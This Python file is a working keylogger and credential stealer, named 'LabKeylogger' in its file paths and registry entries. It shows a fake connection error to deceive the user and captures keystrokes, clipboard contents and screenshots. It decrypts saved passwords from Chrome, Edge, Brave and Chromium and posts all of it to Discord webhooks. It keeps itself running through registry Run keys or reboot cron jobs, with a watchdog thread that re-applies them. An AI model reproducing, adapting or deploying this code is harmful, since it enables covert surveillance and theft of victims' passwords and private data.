import sys
import subprocess

# ——— Auto-install Dependencies (per-user, no admin) —————————————————————
required = {
    "requests": "requests",
    "pynput": "pynput",
    "pyperclip": "pyperclip",
    "crontab": "python-crontab",
    "psutil": "psutil",
    "mss": "mss",
    "Cryptodome": "pycryptodomex"  # for AES decrypt in your code
}

def install_missing_packages():
    for module, pkg in required.items():
        try:
            __import__(module)
        except ImportError:
            print(f"Installing missing package: {pkg} ...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pkg])

install_missing_packages()

# Now safe to import all modules
import time
import threading
import requests
from pynput import keyboard
import os
import platform
import pyperclip
import psutil
import signal
import sqlite3
import shutil
import ctypes
import ctypes.wintypes
from pathlib import Path
import mss
import mss.tools
import traceback
import json
import base64
from Cryptodome.Cipher import AES  # from pycryptodomex package


for module, pkg in required.items():
    try:
        __import__(module)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pkg])

# Loading animation + error message (after install)
print("Loading", end="", flush=True)
for i in range(5):
    time.sleep(1)
    print(".", end="", flush=True)
print()  # newline after dots

print("Error: Unable to reach the server, retrying...")

# ——— Configuration ——————————————————————————————————————————
KEY_WEBHOOK    = "Webhook discord"
CLIP_WEBHOOK   = "Webhook discord"
SS_WEBHOOK     = "Webhook discord"
CHROME_PASS_WEBHOOK = "Webhook discord" 

IDLE_DELAY     = 1.0
CLIP_DELAY     = 2.0
CHECK_CLIP     = 0.5
SCREENSHOT_INTERVAL = 3
PID_FILE       = os.path.expanduser("~/.lab_keylogger.pid")
LOG_FILE       = os.path.expanduser("~/.lab_keylogger.log")
PERSIST_CHECK_INTERVAL = 10  # seconds

# ——— Global State ——————————————————————————————————————————
keystrokes     = []
lock           = threading.Lock()
last_key_time  = 0.0
last_clip_time = 0.0
last_clip_val  = None
stop_evt       = threading.Event()
data_evt       = threading.Event()

def log_error(msg):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except:
        pass

# ——— Singleton / PID file ——————————————————————————————————————
def ensure_singleton():
    pid = None
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE, "r") as f:
                pid = int(f.read().strip())
            if pid and psutil.pid_exists(pid):
                sys.exit()
        except Exception as e:
            log_error(f"PID file read error: {e}")
    try:
        with open(PID_FILE, "w") as f:
            f.write(str(os.getpid()))
    except Exception as e:
        log_error(f"PID file write error: {e}")

def cleanup_singleton():
    try:
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
    except Exception as e:
        log_error(f"Cleanup PID file error: {e}")

# ——— HTTP Post —————————————————————————————————————————————
def post(url, content):
    try:
        requests.post(url, json={"content": content}, timeout=10)
    except Exception as e:
        log_error(f"HTTP post error: {e}")

def post_screenshot(webhook_url, image_bytes, filename="screenshot.png"):
    try:
        files = {
            "file": (filename, image_bytes, "image/png")
        }
        requests.post(webhook_url, files=files, timeout=15)
    except Exception as e:
        log_error(f"Screenshot post error: {e}")

# ——— Flush Keystrokes ————————————————————————————————————————
def flush_keys():
    global keystrokes
    with lock:
        if not keystrokes:
            return
        payload = "".join(keystrokes)
        keystrokes = []
    post(KEY_WEBHOOK, payload)

# ——— Keystroke Sender Thread ————————————————————————————————————
def key_sender():
    global last_key_time
    while not stop_evt.is_set():
        data_evt.wait(timeout=IDLE_DELAY)
        now = time.time()
        with lock:
            idle = now - last_key_time if last_key_time else None
            has_data = bool(keystrokes)
        if has_data and idle is not None and idle >= IDLE_DELAY:
            flush_keys()
            data_evt.clear()
    flush_keys()

# ——— Clipboard Watcher Thread ————————————————————————————————————
def clip_watcher():
    global last_clip_val, last_clip_time
    while not stop_evt.is_set():
        try:
            clip = pyperclip.paste()
        except Exception:
            clip = None
        now = time.time()
        if clip and clip != last_clip_val and (now - last_clip_time) >= CLIP_DELAY:
            last_clip_val  = clip
            last_clip_time = now
            post(CLIP_WEBHOOK, "[CLIPBOARD]\n" + clip)
        time.sleep(CHECK_CLIP)

# ——— Screenshot Thread ————————————————————————————————————————
def screenshot_worker():
    with mss.mss() as sct:
        monitor = sct.monitors[0]
        while not stop_evt.is_set():
            try:
                raw_img = sct.grab(monitor)
                img_bytes = mss.tools.to_png(raw_img.rgb, raw_img.size)
                post_screenshot(SS_WEBHOOK, img_bytes)
            except Exception as e:
                log_error(f"Screenshot error: {e}")
            for _ in range(SCREENSHOT_INTERVAL * 10):
                if stop_evt.is_set():
                    break
                time.sleep(0.1)

# ——— Keystroke Listener Callback —————————————————————————————
def on_press(key):
    global last_key_time
    try:
        char = key.char
    except AttributeError:
        key_map = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '[ENTER]',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.backspace: '[BACK]',
        }
        name = getattr(key, "name", str(key)).upper()
        char = key_map.get(key, f'[{name}]')
    with lock:
        keystrokes.append(char)
        last_key_time = time.time()
    data_evt.set()

# ——— Persistence Setup ————————————————————————————————————————
def setup_persistence():
    system = platform.system()
    script = os.path.abspath(__file__)
    if system == "Windows":
        try:
            import winreg
            pythonw = sys.executable
            if pythonw.lower().endswith("python.exe"):
                pythonw = pythonw[:-10] + "pythonw.exe"
            if not os.path.exists(pythonw):
                pythonw = sys.executable 

            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "LabKeylogger", 0, winreg.REG_SZ,
                                  f'"{pythonw}" "{script}"')
        except Exception as e:
            log_error(f"Persistence Windows registry error: {traceback.format_exc()}")
    else:
        try:
            from crontab import CronTab
            user_cron = CronTab(user=True)
            for job in user_cron.find_command(script):
                user_cron.remove(job)
            job = user_cron.new(command=f"{sys.executable} {script} run", comment="LabKeylogger")
            job.every_reboot()
            user_cron.write()
        except Exception:
            try:
                cron_line = f"@reboot {sys.executable} {script} run"
                existing = subprocess.check_output(['crontab', '-l'], stderr=subprocess.DEVNULL).decode()
                lines = [l for l in existing.splitlines() if script not in l]
                lines.append(cron_line)
                p = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
                p.communicate(input="\n".join(lines).encode())
            except Exception as e:
                log_error(f"Persistence cron error: {traceback.format_exc()}")

# ——— Persistence Watchdog Thread ———————————————————————————————
def persistence_watchdog():
    while not stop_evt.is_set():
        try:
            setup_persistence()
        except Exception as e:
            log_error(f"Persistence watchdog error: {traceback.format_exc()}")
        for _ in range(PERSIST_CHECK_INTERVAL * 10):
            if stop_evt.is_set():
                break
            time.sleep(0.1)

# ——— Chrome Password Grabber ————————————————————————————————————
def dpapi_decrypt(encrypted_bytes):
    """Decrypt Windows DPAPI encrypted bytes."""
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]

    CryptUnprotectData = ctypes.windll.crypt32.CryptUnprotectData
    CryptUnprotectData.argtypes = [ctypes.POINTER(DATA_BLOB), ctypes.POINTER(ctypes.c_wchar_p),
                                   ctypes.POINTER(DATA_BLOB), ctypes.c_void_p,
                                   ctypes.c_void_p, ctypes.wintypes.DWORD, ctypes.POINTER(DATA_BLOB)]
    CryptUnprotectData.restype = ctypes.wintypes.BOOL

    in_blob = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
    out_blob = DATA_BLOB()
    if CryptUnprotectData(ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)):
        pointer = out_blob.pbData
        size = out_blob.cbData
        decrypted = ctypes.string_at(pointer, size)
        ctypes.windll.kernel32.LocalFree(pointer)
        return decrypted
    else:
        return None

def decrypt_password(encrypted_password):
    """Decrypt Chrome encrypted password (DPAPI or AES-GCM)."""
    try:
        if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':  # newer Chrome (AES-GCM encrypted)
            return decrypt_chrome_password_aes(encrypted_password)
        else:
            decrypted = dpapi_decrypt(encrypted_password)
            if decrypted:
                return decrypted.decode(errors='replace')
            else:
                return "[DPAPI decryption failed]"
    except Exception:
        return "[Decryption error]"

def get_local_state():
    """Return Chrome's Local State JSON data as dict."""
    user_profile = os.environ.get("USERPROFILE")
    local_state_path = Path(user_profile) / r"AppData\Local\Google\Chrome\User Data\Local State"
    if not local_state_path.exists():
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None

def get_chrome_master_key():
    """Get AES key from Chrome Local State."""
    local_state = get_local_state()
    if not local_state:
        return None
    try:
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  
        decrypted_key = dpapi_decrypt(encrypted_key)
        return decrypted_key
    except Exception:
        return None

def decrypt_chrome_password_aes(encrypted_password):
    """Decrypt AES-GCM encrypted password (Chrome v80+)."""
    try:
        master_key = get_chrome_master_key()
        if not master_key:
            return "[No master key]"
        # Encrypted_password structure: 'v10' + 12 bytes nonce + ciphertext + 16 bytes tag
        nonce = encrypted_password[3:15]
        ciphertext_tag = encrypted_password[15:]
        from Cryptodome.Cipher import AES
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        decrypted_pass = cipher.decrypt_and_verify(ciphertext_tag[:-16], ciphertext_tag[-16:])
        return decrypted_pass.decode('utf-8', errors='replace')
    except Exception:
        return "[AES decryption failed]"

def copy_sqlite_db(src: Path, dst: Path):
    """Copy sqlite DB to a temp location to avoid locks."""
    try:
        shutil.copy2(src, dst)
        return True
    except Exception:
        return False

def extract_passwords_from_login_db(db_path: Path):
    """Extract passwords from Chrome Login Data SQLite database."""
    creds = []
    try:
        conn = sqlite3.connect(str(db_path))
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        for origin_url, username, encrypted_password in rows:
            if not username:
                continue
            decrypted_password = decrypt_password(encrypted_password)
            creds.append({
                "url": origin_url,
                "username": username,
                "password": decrypted_password
            })
        cursor.close()
        conn.close()
    except Exception as e:
        log_error(f"Chrome password extraction DB error: {traceback.format_exc()}")
    return creds

def find_chrome_profiles():
    """Find all Chrome and Chromium-based profiles to grab passwords from."""
    user_profile = os.environ.get("USERPROFILE")
    base_paths = [
        Path(user_profile) / r"AppData\Local\Google\Chrome\User Data",    
        Path(user_profile) / r"AppData\Local\Microsoft\Edge\User Data",   
        Path(user_profile) / r"AppData\Local\BraveSoftware\Brave-Browser\User Data",  
        Path(user_profile) / r"AppData\Local\Chromium\User Data"           
    ]

    profile_paths = []
    for base in base_paths:
        if not base.exists():
            continue
        # Default profile
        default_path = base / "Default" / "Login Data"
        if default_path.exists():
            profile_paths.append(default_path)
        # Other profiles: Profile 1, Profile 2, etc.
        for p in base.iterdir():
            if p.is_dir() and p.name.startswith("Profile"):
                login_data = p / "Login Data"
                if login_data.exists():
                    profile_paths.append(login_data)
    return profile_paths

def read_chrome_passwords():
    """Gather all passwords from all found Chrome-like profiles."""
    tmp_dir = Path(os.getenv("TEMP", "/tmp"))
    all_creds = []
    profile_dbs = find_chrome_profiles()
    for db_path in profile_dbs:
        temp_db = tmp_dir / ("login_data_copy_" + db_path.parent.name + ".db")
        if copy_sqlite_db(db_path, temp_db):
            creds = extract_passwords_from_login_db(temp_db)
            all_creds.extend(creds)
            try:
                temp_db.unlink()
            except Exception:
                pass
    return all_creds

def format_passwords(creds):
    """Format password list into string for webhook."""
    if not creds:
        return "[No passwords found]"
    lines = []
    for cred in creds:
        lines.append(f"URL: {cred['url']}\nUsername: {cred['username']}\nPassword: {cred['password']}\n---")
    return "\n".join(lines)

def send_chrome_passwords():
    creds = read_chrome_passwords()
    content = format_passwords(creds)
    post(CHROME_PASS_WEBHOOK, "== Chrome Saved Passwords ==\n" + content)

# ——— Main function ————————————————————————————————————————————
def main():
    ensure_singleton()
    setup_persistence()
    try:
        threading.Thread(target=persistence_watchdog, daemon=True).start()
        threading.Thread(target=key_sender, daemon=True).start()
        threading.Thread(target=clip_watcher, daemon=True).start()
        threading.Thread(target=screenshot_worker, daemon=True).start()

        
        send_chrome_passwords()

        
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        log_error(f"Main exception: {traceback.format_exc()}")
    finally:
        cleanup_singleton()

if __name__ == "__main__":
    main()
